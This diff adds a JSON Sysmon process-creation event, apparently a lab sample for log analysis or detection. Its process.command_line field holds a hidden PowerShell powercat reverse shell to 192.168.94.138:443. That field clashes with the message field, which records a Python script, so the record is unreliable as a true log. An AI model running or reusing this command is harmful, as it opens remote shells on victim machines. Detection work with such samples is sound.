@@ -1,0 +1,135 @@
+{
+  "@timestamp": "2021-02-04T22:29:15.730Z",
+  "hash": {
+    "md5": "cc3ac75ddbfaa6d4ccbb0afad7eb759d",
+    "sha256": "3d98a354f1329bfeb17216d2391d6e9c04f6873b6e491bce9734c02c26574b3d"
+  },
+  "ecs": {
+    "version": "1.5.0"
+  },
+  "agent": {
+    "id": "c58de8d4-8be2-444c-bc20-92fab97cbaf5",
+    "name": "CLIENT3",
+    "type": "winlogbeat",
+    "version": "7.10.2",
+    "hostname": "CLIENT3",
+    "ephemeral_id": "f5ed3d9b-1471-4589-bd70-28219e0f5978"
+  },
+  "winlog": {
+    "version": 5,
+    "event_data": {
+      "LogonId": "0x251ae",
+      "TerminalSessionId": "1",
+      "Product": "Python",
+      "OriginalFileName": "py.exe",
+      "LogonGuid": "{19FC45AC-753A-601C-0000-0020AE510200}",
+      "Company": "Python Software Foundation",
+      "IntegrityLevel": "Medium",
+      "Description": "Python",
+      "FileVersion": "3.5.2"
+    },
+    "event_id": 1,
+    "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+    "user": {
+      "domain": "NT AUTHORITY",
+      "type": "User",
+      "identifier": "S-1-5-18",
+      "name": "SYSTEM"
+    },
+    "task": "Process Create (rule: ProcessCreate)",
+    "computer_name": "CLIENT3.breach.local",
+    "opcode": "Info",
+    "process": {
+      "thread": {
+        "id": 1812
+      },
+      "pid": 1536
+    },
+    "channel": "Microsoft-Windows-Sysmon/Operational",
+    "provider_name": "Microsoft-Windows-Sysmon",
+    "api": "wineventlog",
+    "record_id": 1301
+  },
+  "host": {
+    "name": "CLIENT3.breach.local",
+    "mac": [
+      "00:50:56:00:03:03",
+      "00:50:56:00:00:03",
+      "00:00:00:00:00:00:00:e0",
+      "00:00:00:00:00:00:00:e0"
+    ],
+    "hostname": "CLIENT3",
+    "architecture": "x86",
+    "os": {
+      "version": "6.1",
+      "family": "windows",
+      "name": "Windows 7 Professional",
+      "kernel": "6.1.7601.18741 (win7sp1_gdr.150202-1526)",
+      "build": "7601.0",
+      "platform": "windows"
+    },
+    "id": "19fc45ac-5890-4f96-81b1-50ed111c0ce4",
+    "ip": [
+      "192.168.56.103",
+      "172.16.1.3",
+      "fe80::5efe:c0a8:3867",
+      "fe80::5efe:ac10:103"
+    ]
+  },
+  "log": {
+    "level": "information"
+  },
+  "message": "Process Create:\nRuleName: \nUtcTime: 2021-02-04 22:29:15.730\nProcessGuid: {19FC45AC-753B-601C-0000-0010F4A50200}\nProcessId: 2380\nImage: C:\\Windows\\py.exe\nFileVersion: 3.5.2\nDescription: Python\nProduct: Python\nCompany: Python Software Foundation\nOriginalFileName: py.exe\nCommandLine: \"C:\\Windows\\py.exe\" \"C:\\BREACH\\create_filing_dir.py\" \nCurrentDirectory: C:\\BREACH\\\nUser: BREACH\\client3\nLogonGuid: {19FC45AC-753A-601C-0000-0020AE510200}\nLogonId: 0x251ae\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=CC3AC75DDBFAA6D4CCBB0AFAD7EB759D,SHA256=3D98A354F1329BFEB17216D2391D6E9C04F6873B6E491BCE9734C02C26574B3D\nParentProcessGuid: {19FC45AC-753B-601C-0000-001083660200}\nParentProcessId: 2096\nParentImage: C:\\Windows\\explorer.exe\nParentCommandLine: C:\\Windows\\Explorer.EXE",
+  "related": {
+    "hash": [
+      "cc3ac75ddbfaa6d4ccbb0afad7eb759d",
+      "3d98a354f1329bfeb17216d2391d6e9c04f6873b6e491bce9734c02c26574b3d"
+    ],
+    "user": "client3"
+  },
+  "event": {
+    "type": [
+      "start",
+      "process_start"
+    ],
+    "category": [
+      "process"
+    ],
+    "kind": "event",
+    "code": 1,
+    "provider": "Microsoft-Windows-Sysmon",
+    "action": "Process Create (rule: ProcessCreate)",
+    "created": "2021-02-04T22:31:13.178Z",
+    "module": "sysmon"
+  },
+  "process": {
+    "args": [
+      "C:\\Windows\\py.exe",
+      "C:\\BREACH\\create_filing_dir.py"
+    ],
+    "pid": 2380,
+    "executable": "C:\\Windows\\py.exe",
+    "command_line": "\"C:\\Windows\\System32\\cmd.exe\" /c powershell -w hidden -exec bypass cd C:\\Users\\admin\\AppData\\Local\\catchme\\; . .\\cat.ps1; CoNnEct-PoWErcat -Mode Tcp -RemoteIp 192.168.94.138 -Port 443 -Execute ",
+    "working_directory": "C:\\BREACH\\",
+    "parent": {
+      "entity_id": "{19FC45AC-753B-601C-0000-001083660200}",
+      "pid": 2096,
+      "executable": "C:\\Windows\\explorer.exe",
+      "command_line": "C:\\Windows\\Explorer.EXE",
+      "name": "explorer.exe",
+      "args": [
+        "C:\\Windows\\Explorer.EXE"
+      ]
+    },
+    "name": "py.exe",
+    "entity_id": "{19FC45AC-753B-601C-0000-0010F4A50200}",
+    "hash": {
+      "md5": "cc3ac75ddbfaa6d4ccbb0afad7eb759d",
+      "sha256": "3d98a354f1329bfeb17216d2391d6e9c04f6873b6e491bce9734c02c26574b3d"
+    }
+  },
+  "user": {
+    "name": "client3",
+    "domain": "BREACH"
+  }
+}
